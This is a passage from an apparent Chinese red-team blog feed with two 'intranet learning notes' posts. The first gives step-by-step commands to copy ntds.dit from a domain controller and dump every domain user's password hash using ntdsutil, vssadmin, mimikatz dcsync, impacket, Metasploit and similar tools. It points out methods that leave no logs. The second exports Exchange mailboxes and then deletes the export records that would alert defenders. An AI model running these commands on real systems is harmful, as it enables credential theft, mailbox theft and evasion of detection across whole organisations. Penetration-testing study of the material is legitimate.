        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %SystemRoot%\ntds.dit</p><p>ntds.dit 中包含（但不限于）用户名、散列值、组、GPP、OU 等与活动目录相关的信息，因此如果我们拿到 ntds.dit 就能获取到域内所有用户的 hash</p><p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。</p><p>不过使用 Windows 本地卷影拷贝服务，就可以获得文件的副本（类似于虚拟机的快照）</p><h2 id="1、使用卷影拷贝服务提取-ntds-dit"><a href="#1、使用卷影拷贝服务提取-ntds-dit" class="headerlink" title="1、使用卷影拷贝服务提取 ntds.dit"></a>1、使用卷影拷贝服务提取 ntds.dit</h2><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h3><p>ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p><p>该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载刚刚创建的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;mount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 copy 命令将快照中的文件复制到 C 盘下</p><pre class="line-numbers language-none"><code class="language-none">copy C:\$SNAP_202109081356_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除之前加载的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;unmount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; &quot;delete &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询当前系统中的快照，可以看到没有任何快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908135855.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h3><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p><p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在创建的卷影拷贝中将 ntds.dit 复制出来</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除快照</p><pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908145721.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h3><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p><p>vssown.vbs 下载地址：<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>启动卷影拷贝服务</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出当前卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908152359.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p><p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p><p>在域控中以管理员模式打开命令行环境，输入命令</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p><p>将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除</p><pre class="line-numbers language-none"><code class="language-none">rmdir &#x2F;s&#x2F;q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Copy-VSS.ps1Copy-vss或者PowerShell -Exec bypass -C &quot;Import-module .\Copy-VSS.ps1;Copy-vss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。</p><h3 id="diskshadow"><a href="#diskshadow" class="headerlink" title="diskshadow"></a>diskshadow</h3><p>diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。</p><blockquote><p>diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作</p></blockquote><p>首先创建一个 txt 文件，内容如下：</p><pre class="line-numbers language-none"><code class="language-none">set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;C:\windows\system32\cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\ntds.ditdelete shadows alllist shadows allresetexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 diskshadow 调用刚才的文本文件</p><pre class="line-numbers language-none"><code class="language-none">diskshadow &#x2F;s C:\command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908155944.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Invoke-NinjaCopy-ps1"><a href="#Invoke-NinjaCopy-ps1" class="headerlink" title="Invoke-NinjaCopy.ps1"></a>Invoke-NinjaCopy.ps1</h3><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p><p>PowerSploit 工具包项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>impacket 安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.gitcd impacketpython3 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过 impacket  里的 secretsdump.py 脚本可以直接远程读取 ntds.dit 并导出哈希值</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2、导出-ntds-dit-文件中的散列值"><a href="#2、导出-ntds-dit-文件中的散列值" class="headerlink" title="2、导出 ntds.dit 文件中的散列值"></a>2、导出 ntds.dit 文件中的散列值</h2><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>安装 esedbexport，以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-configwget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20210424&#x2F;libesedb-experimental-20210424.tar.gztar zxvf libesedb-experimental-20210424.tar.gzcd libesedb-20210424.&#x2F;configuremakemake installldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>导出 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 ntdsxtract</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.gitcd ntdsxtractpython setup.py buildpython setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p><pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export&#x2F;datatable.3 ntds.dit.export&#x2F;link_table.5 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908171420.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p><pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将 ntds.dit.export 和 SYSTEM 文件放入到 impacket 工具的文件夹中</p><pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接使用 python 执行 secretsdump.py 文件</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p><pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件，不过需要管理员权限。</p><p>导出域内所有用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出域内指定用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过转储 lsass.exe 进行 dump 操作</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;inject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了</p></blockquote><h3 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h3><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p><p>Invoke-DCSync.ps1 下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .&#x2F;Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下 </p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrabset rhosts 192.168.7.7set smbdomain teamssix.comset smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdumpset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p></blockquote><h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>DSInternals 下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p><p>安装 DSInternals</p><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接导出 hash，并保存在 output_hash.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="vshaow-和-QuarksPwDump"><a href="#vshaow-和-QuarksPwDump" class="headerlink" title="vshaow 和 QuarksPwDump"></a>vshaow 和 QuarksPwDump</h3><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><pre class="line-numbers language-none"><code class="language-none">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;&#x3D;&#x3D;&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER&#x3D;%SystemDrive%set SOURCE_RELATIVE_PATH&#x3D;windows\ntds\ntds.ditset DESTINATION_PATH&#x3D;%~dp0@echo ...Determine the scripts to be executed&#x2F;generated...set CALLBACK_SCRIPT&#x3D;%~dpnx0set TEMP_GENERATED_SCRIPT&#x3D;GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script&#x3D;%TEMP_GENERATED_SCRIPT% -exec&#x3D;&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del &#x2F;f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p><p>使用 esentutl 修复导出的 ntds.dit 文件</p><pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p><pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 log 里就能看到导出的密码哈希了</p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1752212">https://cloud.tencent.com/developer/article/1752212</a></p><p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p><p><a href="https://blog.csdn.net/qq_45742511/article/details/117301437">https://blog.csdn.net/qq_45742511/article/details/117301437</a></p><p><a href="https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/">https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】25、Exchange 邮件服务器</title>
      <link href="//210908-105249.html"/>
      <url>//210908-105249.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、Exchange-的基本操作"><a href="#1、Exchange-的基本操作" class="headerlink" title="1、Exchange 的基本操作"></a>1、Exchange 的基本操作</h2><blockquote><p>在 Exchange 服务器上的 PowerShell 里进行以下操作</p></blockquote><p>将 Exchange 管理单元添加到当前会话中</p><pre class="line-numbers language-none"><code class="language-none">add-pssnapin microsoft.exchange*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看邮件数据库</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -server &quot;dc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询数据库的物理路径</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -Identity &#39;Mailbox Database 0761701514&#39; | Format-List Name,EdbFilePath,LogFolderPath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取现有用户的邮件地址</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox | Format-table Name,WindowsEmailAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看指定用户的邮箱使用信息</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailboxstatistics -Identity Administrator | Select Dispayname,ItemCount,TotalItemSize,TotalTimeSize,LastLogonTime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取用户邮箱中的邮件数量，通过该命令还可以列出那些用户未登录过邮箱</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -ResultSize Unlimited | Get-Mailboxstatistics | Sort-Object TotalItemSize -Descend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、导出指定的电子邮箱"><a href="#2、导出指定的电子邮箱" class="headerlink" title="2、导出指定的电子邮箱"></a>2、导出指定的电子邮箱</h2><p>Exchange Server 2007 中需要使用 ExportMailBox 命令，在 Exchange Server 2010 SP1 及以后的版本中可以使用图形化界面导出，也可以使用 PowerShell</p><p>如果想要导出 PTS 格式的邮件文件，则需要为用户配置导出/导出权限。</p><h3 id="配置用户的导入导出权限"><a href="#配置用户的导入导出权限" class="headerlink" title="配置用户的导入导出权限"></a>配置用户的导入导出权限</h3><p>查看用户权限</p><pre class="line-numbers language-none"><code class="language-none">Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 Administrator 用户添加到 Mailbox Import Export  角色组里，将用户添加到角色组后，需要重启 Exchange 服务才能执行导出操作</p><pre class="line-numbers language-none"><code class="language-none">New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除刚刚添加的 Mailbox Import Export 角色组中的用户</p><pre class="line-numbers language-none"><code class="language-none">Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h3><p>不论使用哪种方式导出邮件，都需要将文件放置在 UNC（Universal Naming Convention，通用命名规则，也称通用命名规范）路径下</p><p>类似于 “\hostname\sharename”、“\ipaddress\sharename” 的网络路径下，sharename 为网络共享名称。</p><p>首先开启共享，将 C 盘 inetpub 文件夹设置为 everyone 可读写，执行如下命令：</p><pre class="line-numbers language-none"><code class="language-none">net share inetpub&#x3D;c:\inetpub &#x2F;grant:everyone,full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h3><p>使用 PowerShell 导出电子邮件，用户的电子邮箱目录一般为Inbox（收件箱）、SentItems（已发送邮件）、DeleteItems（已删除邮件）、Drafts（草稿）等</p><pre class="line-numbers language-none"><code class="language-none">New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.7.77\inetpub\administrator.pst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用图形化界面导出电子邮件，访问 <a href="https://127.0.0.1/ecp%EF%BC%8C%E6%89%93%E5%BC%80">https://127.0.0.1/ecp，打开</a> Exchange 管理中心的登录界面。</p><p>输入账号密码进入 Exchange 管理中心，点击「…」更多按钮，选择「导出到 PST 文件」即可进行导出操作。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908104558.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="管理导出请求"><a href="#管理导出请求" class="headerlink" title="管理导出请求"></a>管理导出请求</h3><p>不论是通过 Powershell 导出还是通过图形化的方式导出，都会在 Exchange 中生成一条告警信息，这些信息有助于 BT 发现服务器里的异常行为，通过以下命令，可以查看之前的导出请求记录信息。</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将指定用户已经完成的导出请求删除</p><pre class="line-numbers language-none"><code class="language-none">Remove-MailboxExportRequest -Identity Administrator\MailboxExport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已完成的导出请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有导出请求，包括完成和失败的请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/micr067/p/12307519.html">https://www.cnblogs.com/micr067/p/12307519.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】24、SPN 的应用</title>
      <link href="//210907-121204.html"/>
      <url>//210907-121204.html</url>
      
